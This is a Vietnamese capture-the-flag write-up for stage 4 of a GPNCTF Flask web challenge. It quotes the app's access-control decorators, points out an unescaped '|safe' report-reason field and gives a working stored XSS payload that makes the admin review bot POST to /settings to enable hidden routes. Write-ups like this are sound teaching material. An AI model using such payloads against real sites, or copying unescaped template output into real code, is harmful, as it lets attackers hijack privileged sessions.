![image](https://github.com/user-attachments/assets/2f11bf17-7361-495a-8645-b48b14afc5b2)

# **ANALYZE**

Đến với Stage_4 , thì mục tiêu của ta chính là Lấy được giá trị FLAG_STAGE_4 được bảo vệ tại route:

```
@app.route("/development")
@login_required
@moderator_required
@development_routes_enabled
def development():
    return f"Flag 4: {os.environ.get('FLAG_STAGE_4')}"
```

Route này bị ẩn nếu SHOW_DEVELOPMENT_ROUTES chưa được bật, và chỉ cho phép truy cập bởi người dùng có role là "moderator" hoặc "admin"

Khi ta truy cập vào `/development` thì lại hiện 1 dòng thông báo

![image](https://github.com/user-attachments/assets/c13d19d0-eba9-42b1-8c96-6c0f6013a86a)

Và nó chứa 1 số lớp bảo vệ ta cần phải vượt qua : 

1. @login_required
Người dùng phải đăng nhập. Kiểm tra trong session:

```
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if 'user' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
```
=> Cần session['user'] tồn tại .

2. @moderator_required
Người dùng phải có quyền "moderator" hoặc "admin":

```
def is_mod():
    return 'user' in session and session['user']['role'] in ['admin', 'moderator']

def moderator_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not is_mod():
            return "Unauthorized", 403
        return f(*args, **kwargs)
```
=> Cần session['user']['role'] ∈ ["admin", "moderator"] .

3. @development_routes_enabled
Chỉ bật route nếu biến SHOW_DEVELOPMENT_ROUTES = True:

Và ở phía bên trên khi tôi truy cập vào thì nó được báo là `'not enable'`

![image](https://github.com/user-attachments/assets/444bee38-a3a0-4ffe-a4ec-6bf36544d55c)

```
def development_routes_enabled(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not SHOW_DEVELOPMENT_ROUTES:
            return "Development routes are not enabled", 403
        return f(*args, **kwargs)
```

 Mặc định SHOW_DEVELOPMENT_ROUTES = False, phải bật lên bằng `/settings`

Nhưng , Chỉ admin có thể POST đến /settings để bật:

Nếu dùng tài khoản mod thì sẽ ko được 


Chỉ admin có thể POST đến /settings để bật:
```
@app.route("/settings", methods=["GET", "POST"])
@admin_required
def settings():
    global SHOW_DEVELOPMENT_ROUTES
    if request.method == "POST":
        data = request.get_json()
        if data and data.get("show_development_routes"):
            SHOW_DEVELOPMENT_ROUTES = True
            return "Settings updated"
```
=>  Cần vượt qua decorator @admin_required

`@admin_required` kiểm tra cookie `ADMIN_PASSWORD`

```
def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if request.cookies.get("ADMIN_PASSWORD"):
            if hashlib.sha512(request.cookies.get("ADMIN_PASSWORD").encode()).hexdigest() == os.environ.get("ADMIN_PASSWORD_HASH"):
                return f(*args, **kwargs)
        return "Unauthorized", 403
```
=> Vậy, chỉ bot, vốn được thiết lập với ADMIN_PASSWORD hợp lệ, mới có thể bật chế độ development.

Không thể bật thủ công → nhưng có XSS
Flask render lý do report note bằng template không escape:

```
<p>Report reason: {{ note.reason|safe }}</p>
```
Nếu attacker chèn <script> vào lý do report → khi bot (đăng nhập admin) duyệt /report/<id>, đoạn JavaScript sẽ thực thi trong phiên admin của bot.

# **EXPLOIT**

PAYLOAD sẽ là : 
```
</textarea><script>
fetch('/settings', {
  method: 'POST',
  headers: {'Content-Type':'application/json'},
  body: JSON.stringify({show_development_routes:true})
});
</script><textarea>
```

Đoạn script thực hiện:

Gửi POST request đến /settings

Bật SHOW_DEVELOPMENT_ROUTES = true

Dưới ngữ cảnh của bot admin → vượt qua được @admin_required


![image](https://github.com/user-attachments/assets/758fe6bf-6252-4359-9a65-bfd0a1260ca0)


![image](https://github.com/user-attachments/assets/55dd1dd3-925c-46da-bc6d-77d09422c3ea)


Bot truy cập /report/<note_id>, nơi nội dung lý do xuất hiện:

```
<p>Report reason: </textarea><script>...</script><textarea></p>
```
JavaScript được thực thi → dev mode được bật thành công.

Và khi ta truy cập lại vào `/development` thì ta sẽ nhận được flag 

![image](https://github.com/user-attachments/assets/3e6a2a34-ffee-4e83-83df-030840ff3d18)

# **FLAG**

```
GPNCTF{flag_stage_4_the_real_flag_will_be_on_the_provided_instance}
```




